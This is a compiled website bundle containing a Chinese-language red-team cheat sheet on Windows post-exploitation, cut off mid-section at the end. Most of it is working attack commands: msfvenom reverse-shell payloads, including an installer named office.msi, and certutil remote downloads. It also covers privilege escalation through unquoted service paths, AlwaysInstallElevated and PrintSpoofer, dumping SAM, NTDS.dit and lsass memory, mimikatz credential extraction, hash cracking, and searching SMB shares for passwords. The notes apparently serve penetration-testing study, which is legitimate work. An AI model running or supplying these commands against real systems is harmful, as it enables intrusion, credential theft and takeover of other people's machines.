"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[1724],{8927:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>h,contentTitle:()=>c,default:()=>t,frontMatter:()=>d,metadata:()=>l,toc:()=>o});const l=JSON.parse('{"id":"Cyber-Security/Red_Team/Windows_Post_Exploitation","title":"Windows \u5f8c\u6ef2\u900f","description":"- Msfvenom","source":"@site/docs/Cyber-Security/Red_Team/Windows_Post_Exploitation.md","sourceDirName":"Cyber-Security/Red_Team","slug":"/Cyber-Security/Red_Team/Windows_Post_Exploitation","permalink":"/docs/Cyber-Security/Red_Team/Windows_Post_Exploitation","draft":false,"unlisted":false,"tags":[],"version":"current","frontMatter":{"sidebar_label":"\u7d05\u968a\u5b89\u5168 | Windows \u5f8c\u6ef2\u900f"},"sidebar":"tutorialSidebar","previous":{"title":"\u7d05\u968a\u5b89\u5168 | \u4e0d\u958b\u555f Powershell \u57f7\u884c powershell.exe","permalink":"/docs/Cyber-Security/Red_Team/Powershell"},"next":{"title":"\u7d05\u968a\u5b89\u5168 | LOLBAS \u4e0b\u8f09\u5de5\u5177","permalink":"/docs/Cyber-Security/Red_Team/lolbas"}}');var i=s(4848),r=s(8453);const d={sidebar_label:"\u7d05\u968a\u5b89\u5168 | Windows \u5f8c\u6ef2\u900f"},c="Windows \u5f8c\u6ef2\u900f",h={},o=[{value:"\u672c\u5730 Download \u9060\u7aef Reverse shell",id:"\u672c\u5730-download-\u9060\u7aef-reverse-shell",level:2},{value:"\u624b\u52d5\u679a\u8209\u5bc6\u78bc",id:"\u624b\u52d5\u679a\u8209\u5bc6\u78bc",level:2},{value:"\u81ea\u52d5\u5316\u5de5\u5177\u5229\u7528",id:"\u81ea\u52d5\u5316\u5de5\u5177\u5229\u7528",level:2},{value:"Bypass UAC (User account control)",id:"bypass-uac-user-account-control",level:2},{value:"\u52ab\u6301 Token",id:"\u52ab\u6301-token",level:2},{value:"Insecure Service Permissions",id:"insecure-service-permissions",level:2},{value:"Service Unquoted Path",id:"service-unquoted-path",level:2},{value:"\u5229\u7528\u65b9\u5f0f",id:"\u5229\u7528\u65b9\u5f0f",level:3},{value:"\u5b89\u88dd\u63d0\u6b0a\u539f\u5247",id:"\u5b89\u88dd\u63d0\u6b0a\u539f\u5247",level:2},{value:"\u6b0a\u9650\u4f4e\u5230\u9ad8(\u4e0b\u5230\u4e0a)",id:"\u6b0a\u9650\u4f4e\u5230\u9ad8\u4e0b\u5230\u4e0a",level:3},{value:"\u5f9e Administrators \u63d0\u6b0a\u5230 System",id:"\u5f9e-administrators-\u63d0\u6b0a\u5230-system",level:3},{value:"\u5bc6\u78bc\u6536\u96c6",id:"\u5bc6\u78bc\u6536\u96c6",level:2},{value:"SAM",id:"sam",level:3},{value:"deHash",id:"dehash",level:3},{value:"lsass",id:"lsass",level:3},{value:"Dump memory",id:"dump-memory",level:2},{value:"NFS",id:"nfs",level:2},{value:"ftp",id:"ftp",level:2},{value:"SMB",id:"smb",level:2},{value:"Password Sparying",id:"password-sparying",level:3},{value:"Forced Authentication Attacks",id:"forced-authentication-attacks",level:3},{value:"NTLM Relay",id:"ntlm-relay",level:3},{value:"\u900f\u904e SMB \u505a\u6a6b\u5411\u79fb\u52d5",id:"\u900f\u904e-smb-\u505a\u6a6b\u5411\u79fb\u52d5",level:3},{value:"Pass the Hash",id:"pass-the-hash",level:3},{value:"\u679a\u8209\u540c\u7d44\u5e33\u5bc6\u7684\u5176\u5b83\u96fb\u8166",id:"\u679a\u8209\u540c\u7d44\u5e33\u5bc6\u7684\u5176\u5b83\u96fb\u8166",level:4},{value:"\u522e\u5176\u5b83\u53f0\u96fb\u8166\u7684 SAM",id:"\u522e\u5176\u5b83\u53f0\u96fb\u8166\u7684-sam",level:4},{value:"RPC",id:"rpc",level:2},{value:"SQL",id:"sql",level:2},{value:"MySQL\uff1a",id:"mysql",level:3},{value:"MSSQL",id:"mssql",level:3},{value:"RDP",id:"rdp",level:2},{value:"Login",id:"login",level:3},{value:"Password Spraying",id:"password-spraying",level:3},{value:"Session Hijacking",id:"session-hijacking",level:3},{value:"Pass The Hash",id:"pass-the-hash-1",level:3}];function x(e){const n={a:"a",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",h3:"h3",h4:"h4",header:"header",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,r.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.header,{children:(0,i.jsx)(n.h1,{id:"windows-\u5f8c\u6ef2\u900f",children:"Windows \u5f8c\u6ef2\u900f"})}),"\n",(0,i.jsx)(n.h1,{id:"reverse-shell",children:"Reverse shell"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["Msfvenom","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > s.exe"})}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.h2,{id:"\u672c\u5730-download-\u9060\u7aef-reverse-shell",children:"\u672c\u5730 Download \u9060\u7aef Reverse shell"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["Windows\uff1a",(0,i.jsx)(n.code,{children:"certutil -urlcache -f URL OUTFILE"})]}),"\n",(0,i.jsxs)(n.li,{children:["Living Off The Land Binaries\uff1a",(0,i.jsx)(n.a,{href:"https://lolbas-project.github.io/",children:"https://lolbas-project.github.io/"})," --\x3e \u7528\u767d\u540d\u55ae Binary \u4e0b\u8f09"]}),"\n"]}),"\n",(0,i.jsx)(n.h1,{id:"information-gathering",children:"Information Gathering"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["\u6211\u662f\u8ab0\uff1a","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"whoami"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"echo %username%"})}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["\u6211\u5728\u54ea\uff1a","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"hostname"}),"\uff1a\u96fb\u8166\u540d\u7a31"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"systeminfo"}),"\uff1a\u7cfb\u7d71\u7684\u5404\u7a2e\u8cc7\u8a0a"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"tasklist"}),"\uff1a\u985e\u4f3c\u5de5\u4f5c\u7ba1\u7406\u54e1"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"cd"}),"\uff1a\u4e0d\u5e36\u53c3\u6578\u53ef\u4ee5\u4f5c\u70ba linux \u7684 pwd \u4f7f\u7528"]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.h1,{id:"privilege-escalation",children:"Privilege Escalation"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"NT Authority\\System \u9ad8\u6b0a\u9650\r\nNT Authority\\Network Service\r\nNT Authority\\Local Service \u5e73\u5e38\u5728\u9019\r\nNT Authority\\IUSR\n"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["Local Admin \u6bd4 Domain Admin \u597d\u62ff","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:'net localgroup "Administrators\u201d'}),"\n",(0,i.jsx)(n.li,{children:"net user Administrators"}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.h2,{id:"\u624b\u52d5\u679a\u8209\u5bc6\u78bc",children:"\u624b\u52d5\u679a\u8209\u5bc6\u78bc"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:'findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml'})}),"\n"]}),"\n",(0,i.jsx)(n.h2,{id:"\u81ea\u52d5\u5316\u5de5\u5177\u5229\u7528",children:"\u81ea\u52d5\u5316\u5de5\u5177\u5229\u7528"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsxs)(n.p,{children:["Windows Exploit Suggester - Next Generation (WES-NG)\uff1a\r\n",(0,i.jsx)(n.a,{href:"https://github.com/bitsadmin/wesng",children:"https://github.com/bitsadmin/wesng"})]}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["\u532f\u51fa systeminfo\r\n",(0,i.jsx)(n.code,{children:"systeminfo > systeminfo.txt"})]}),"\n",(0,i.jsxs)(n.li,{children:["\u66f4\u65b0\u8cc7\u6599\u5eab\r\n",(0,i.jsx)(n.code,{children:"python wes.py --update"})]}),"\n",(0,i.jsxs)(n.li,{children:["\u6bd4\u5c0d\u5f31\u9ede --\x3e \u5229\u7528\u63d0\u6b0a\u6f0f\u6d1e\r\n",(0,i.jsx)(n.code,{children:"python wes.py systeminfo.txt -e"})]}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsx)(n.p,{children:"Winpeas"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.a,{href:"https://github.com/carlospolop/PEASS-ng/releases/tag/20231011-b4d494e5",children:"https://github.com/carlospolop/PEASS-ng/releases/tag/20231011-b4d494e5"})}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.h2,{id:"bypass-uac-user-account-control",children:"Bypass UAC (User account control)"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"\u57f7\u884c\u5f8c\u53ef\u4ee5\u4ee5\u9ad8\u6b0a\u9650\u57f7\u884c\u7a0b\u5f0f"}),"\n",(0,i.jsxs)(n.li,{children:["Tool\uff1a",(0,i.jsx)(n.a,{href:"https://github.com/hfiref0x/UACME",children:"https://github.com/hfiref0x/UACME"})]}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.a,{href:"https://gist.github.com/tyranid/c24cfd1bd141d14d4925043ee7e03c82",children:"SCMUACBypass"})}),"\n"]}),"\n",(0,i.jsx)(n.h2,{id:"\u52ab\u6301-token",children:"\u52ab\u6301 Token"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["PrintSpoofer","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"Local/Network"})," Service to ",(0,i.jsx)(n.code,{children:"SYSTEM"})]}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.a,{href:"https://github.com/itm4n/PrintSpoofer",children:"https://github.com/itm4n/PrintSpoofer"})}),"\n",(0,i.jsxs)(n.li,{children:["usage\uff1a",(0,i.jsx)(n.code,{children:'PrintSpoofer.exe -c "command"'})]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.h2,{id:"insecure-service-permissions",children:"Insecure Service Permissions"}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsxs)(n.li,{children:["\u67e5\u770b service \u5b58\u53d6\uff1a",(0,i.jsx)(n.code,{children:"accesschk.exe /accepteula -uwcqv <user> *"})]}),"\n",(0,i.jsxs)(n.li,{children:["\u67e5\u770b service \u6b0a\u9650 (\u8981\u6709",(0,i.jsx)(n.code,{children:"SYSTEM"}),"\u53ef\u4ee5\u57f7\u884c\u7684\u6b0a\u9650)\uff1a",(0,i.jsx)(n.code,{children:'wmic service where name="<service>" get name, caption, state, startmode, startname'})]}),"\n"]}),"\n",(0,i.jsx)(n.h2,{id:"service-unquoted-path",children:"Service Unquoted Path"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Windows \u5728\u8655\u7406\u542b\u6709\u7a7a\u767d\u7684\u8def\u5f91\u6642\uff0c\u9700\u8981\u4ee5\u96d9\u5f15\u865f\u6846\u8d77\u3002"}),"\n",(0,i.jsx)(n.li,{children:"\u6c92\u6709\u7528\u96d9\u5f15\u865f\u6846\u8d77\u5c31\u6709\u6a5f\u6703\u89f8\u767c Unquoted Service Paths \u800c\u9054\u5230\u63d0\u6b0a\u3002"}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"C:\\Program Files\\Program\\My files\\game.exe"})," \u7531\u4e0a\u800c\u4e0b\u89e3\u6790\uff1a","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"C:\\Program.exe"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"C:\\Program Files\\Program\\My.exe"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"C:\\Program Files\\Program\\My files\\game.exe"})}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"\u5229\u7528\u65b9\u5f0f",children:"\u5229\u7528\u65b9\u5f0f"}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"wmic service get name,displayname,pathname,startmode"})," \u5217\u51fa\u670d\u52d9\u8def\u5f91\u3002"]}),"\n",(0,i.jsxs)(n.li,{children:["msfvenom \u88fd\u4f5c\u5f8c\u9580\uff0c\u547d\u540d\u70ba ",(0,i.jsx)(n.code,{children:"My.exe"})]}),"\n",(0,i.jsxs)(n.li,{children:["\u4e0a\u50b3\u5f8c\u9580\u81f3 ",(0,i.jsx)(n.code,{children:"C:\\Program Files\\Program\\"})]}),"\n",(0,i.jsx)(n.li,{children:"\u91cd\u555f\u670d\u52d9\uff0c\u89f8\u767c\u60e1\u610f\u6587\u4ef6\u57f7\u884c\u3002"}),"\n",(0,i.jsxs)(n.li,{children:["\u63d0\u6b0a\u81f3 ",(0,i.jsx)(n.code,{children:"BUILTIN\\Administrators"})]}),"\n"]}),"\n",(0,i.jsx)(n.h2,{id:"\u5b89\u88dd\u63d0\u6b0a\u539f\u5247",children:"\u5b89\u88dd\u63d0\u6b0a\u539f\u5247"}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsx)(n.li,{children:"\u5b89\u88ddAlwaysInstallElevated"}),"\n"]}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"})}),"\n"]}),"\n",(0,i.jsxs)(n.ol,{start:"2",children:["\n",(0,i.jsx)(n.li,{children:"msfvenom \u751f\u6210\u5f8c\u9580(.msi\u5b89\u88dd\u6a94)"}),"\n"]}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<PORT> -f msi -o office.msi"})}),"\n"]}),"\n",(0,i.jsxs)(n.ol,{start:"3",children:["\n",(0,i.jsx)(n.li,{children:"\u9060\u7aef\u639b\u8f09kali\u76ee\u9304"}),"\n",(0,i.jsx)(n.li,{children:"rdp \u958b\u8a72\u639b\u8f09\u76ee\u9304\uff0c\u4e26\u57f7\u884c\u5b89\u88dd"}),"\n",(0,i.jsxs)(n.li,{children:["\u53d6\u5f97",(0,i.jsx)(n.code,{children:"SYSTEM"})," \u6b0a\u9650"]}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"\u6b0a\u9650\u4f4e\u5230\u9ad8\u4e0b\u5230\u4e0a",children:"\u6b0a\u9650\u4f4e\u5230\u9ad8(\u4e0b\u5230\u4e0a)"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"NT AUTHORITY\\SYSTEM"}),"\n",(0,i.jsx)(n.li,{children:"BUILTIN\\Administrators"}),"\n",(0,i.jsx)(n.li,{children:"\u96fb\u8166\u540d\u7a31\\\u4f7f\u7528\u8005\u540d\u7a31(\u4e00\u822c\u4f7f\u7528\u8005)"}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"\u5f9e-administrators-\u63d0\u6b0a\u5230-system",children:"\u5f9e Administrators \u63d0\u6b0a\u5230 System"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"\u524d\u63d0\uff1a\u63d0\u6b0a\u5f8c\u7684\u4f7f\u7528\u8005\u5df2\u7d93\u5728 Admin \u7fa4\u7d44"}),"\n",(0,i.jsx)(n.li,{children:"\u5f9e Administrators \u63d0\u6b0a\u5230 System \u662f Feature \uff0c\u4e0d\u662f\u6f0f\u6d1e"}),"\n",(0,i.jsxs)(n.li,{children:["\u7d93\u904e\u63d0\u6b0a\u5f8c\u5230 ",(0,i.jsx)(n.strong,{children:"Administrators"})," \u7684 shell\uff1a",(0,i.jsx)(n.code,{children:"psexec.exe -s -i cmd.exe"})]}),"\n"]}),"\n",(0,i.jsx)(n.h2,{id:"\u5bc6\u78bc\u6536\u96c6",children:"\u5bc6\u78bc\u6536\u96c6"}),"\n",(0,i.jsx)(n.h3,{id:"sam",children:"SAM"}),"\n",(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsxs)(n.p,{children:["Security Account Manager\uff0c\u5b58\u5132\u7528\u6236\u5bc6\u78bc\r\n\u4f4d\u7f6e\uff1a",(0,i.jsx)(n.code,{children:"C:\\Windows\\System32\\config\\SAM"})]}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:"\u532f\u51fa SAM \u6a94\uff1a"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["USAGE-1\uff1a","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"reg save HKLM\\SAM <save_filename>"})}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"reg save HKLM\\SYSTEM <save_filename>"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Default file name\uff1aC:\\inetpub\\wwwroot\\sam.zip"}),"\n"]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["USAGE-2\uff1a","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["\u5229\u7528\u52ab\u6301 token \u4f86\u7372\u5f97SAM","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:'PrintSpoofer64.exe -c "reg save HKLM\\SAM C:\\inetpub\\wwwroot\\sam.zip"'})}),"\n"]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["USAGE-3\uff1a","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"Invoke-NinjaCopy"}),"\uff1a","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["Github:\r\n",(0,i.jsx)(n.a,{href:"https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1"})]}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"Invoke-NinjaCopy -Path SAM -LocalDestination SAM_COPY"})}),"\n"]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["\u89e3\u6790SAM","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"pwdump.py"}),"\n",(0,i.jsx)(n.li,{children:"samdump2"}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"move sam.save \\\\<ip>\\NameofFileShare"})}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"dehash",children:"deHash"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["online dehash: ",(0,i.jsx)(n.a,{href:"https://www.cmd5.com/",children:"https://www.cmd5.com/"})]}),"\n",(0,i.jsxs)(n.li,{children:["Hashcat","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"hashcat -a 0 -m 1000 ntlm.hash pass.dict --force"})}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["john","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"john ntlm.hash -w=pass.dict --format=NT"})}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"lsass",children:"lsass"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["\u5fae\u8edf\u6703\u5c07\u4f7f\u7528\u8005\u6191\u8b49\u8cc7\u8a0a\u66ab\u5b58\u5728 lsass.exe","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"Get-Process lsass"})}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 672 C:\\lsass.dmp full"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"pypykatz lsa minidump /path/to/lsassdumpfile"})}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.a,{href:"https://github.com/gentilkiwi/mimikatz/releases",children:"mimikatz"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"AV \u53ef\u80fd\u6703\u6bba --\x3e \u89e3\u6cd5\uff1aDump-memory"}),"\n",(0,i.jsx)(n.li,{children:"\u53d6\u5f97 Administrator\u5f8c\u4f7f\u7528"}),"\n",(0,i.jsx)(n.li,{children:"\u89e3\u6790\u5176\u8a18\u61b6\u9ad4\u5167\u5bb9\uff0c\u6316\u51fa\u5e33\u865f\u3001Hash"}),"\n",(0,i.jsx)(n.li,{children:"\u7ba1\u7406\u54e1\u6b0a\u9650\u958b\u555f"}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"privilege::debug"}),"\uff1a\u5207\u63db\u5230 Debug \u6b0a\u9650"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"sekurlsa::logonpasswords"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"\u53d6\u5f97 LSASS \u4e2d\u7684\u767b\u5165\u5bc6\u78bc"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"misc::memssp"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"\u8655\u7406lsass\u5167\u5b58\uff0c\u900f\u904e\u6a19\u8b58\u548cpatch\u51fd\u6578\u4ee5\u91cd\u5b9a\u5411\u57f7\u884c\u4f86\u9032\u884c\u3002"}),"\n"]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"cmd.exe /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\Windows\\NTDS\\NTDS.dit c:\\NTDS\\NTDS.dit"})," (\u7528\u65bc DCsync)"]}),"\n"]}),"\n",(0,i.jsx)(n.h2,{id:"dump-memory",children:"Dump memory"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsxs)(n.p,{children:["Procdump\uff1a",(0,i.jsx)(n.a,{href:"https://docs.microsoft.com/zh-tw/sysinternals/downloads/procdump",children:"https://docs.microsoft.com/zh-tw/sysinternals/downloads/procdump"})]}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["\u53d6\u5f97 minidump\uff1a",(0,i.jsx)(n.code,{children:"Procdump.exe -accepteula -ma lsass.exe lsass.dmp"})]}),"\n",(0,i.jsxs)(n.li,{children:["mimikatz\uff1a\r\n",(0,i.jsx)(n.code,{children:"Sekurlsa::minidump \u201c/To/PATH/lsass.dmp\u201d"}),"\r\n",(0,i.jsx)(n.code,{children:"Sekurlsa::logonPasswords"})]}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsx)(n.p,{children:"\u8a18\u61b6\u9ad4\u9451\u8b58\u5de5\u5177"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Rekall"}),"\n",(0,i.jsx)(n.li,{children:"Volatility"}),"\n",(0,i.jsx)(n.li,{children:"Windbg"}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.h1,{id:"attacking-service",children:"Attacking Service"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["enum4linux \u679a\u8209\uff1a","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"enum4linux-ng.py <IP> -A -C"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"enum4linux <IP> -A -C"})}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.h2,{id:"nfs",children:"NFS"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"showmount -e <IP>"})}),"\n"]}),"\n",(0,i.jsx)(n.h2,{id:"ftp",children:"ftp"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"ftp <IP> <port>"}),"(Port \u9810\u8a2d\u662f 21)","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"\u533f\u540d\u767b\u5165\uff1aroot/anonymous"}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"dir"}),"(\u5217\u8209\u5167\u5bb9), ",(0,i.jsx)(n.code,{children:"prompt"}),", ",(0,i.jsx)(n.code,{children:"mget"}),"(\u4e0b\u8f09)"]}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"wget -m --no-passive ftp://anonymous:anonymous@<IP>"})," \u4e0b\u8f09\u6240\u6709\u6a94\u6848"]}),"\n"]}),"\n",(0,i.jsx)(n.h2,{id:"smb",children:"SMB"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["\u958b\u555f\u5171\u4eab\u76ee\u9304\uff1a","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["CMD\uff1a","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"dir \\\\IP\\FILE\\"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"net use n: \\\\IP\\FILE\\"})}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["PowerShell\uff1a","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"Get-ChildItem \\\\IP\\FILE\\"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:'New-PSDrive -Name "N" -Root "\\\\IP\\FILE\\" -PSProvider "FileSystem"'})}),"\n"]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["\u5982\u679c\u9700\u8981\u767b\u5165\u6b0a\u9650\uff1a","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"net use n: \\\\IP\\FILE\\ /user:<user> <Password>"})}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["\u641c\u5c0b\u654f\u611f\u8cc7\u6599\uff1a","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"dir n:\\*...* /s /b"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"... \u53ef\u4ee5\u662f\u4efb\u610f\u53ef\u80fd\u5b58\u653e\u654f\u611f\u8cc7\u8a0a\u7684\u8cc7\u6599\u593e\u540d\u7a31\uff1a"}),"\n",(0,i.jsx)(n.li,{children:"credential"}),"\n",(0,i.jsx)(n.li,{children:"password"}),"\n",(0,i.jsx)(n.li,{children:"key"}),"\n",(0,i.jsx)(n.li,{children:"license"}),"\n",(0,i.jsx)(n.li,{children:"config"}),"\n",(0,i.jsx)(n.li,{children:"..."}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["windows CMD 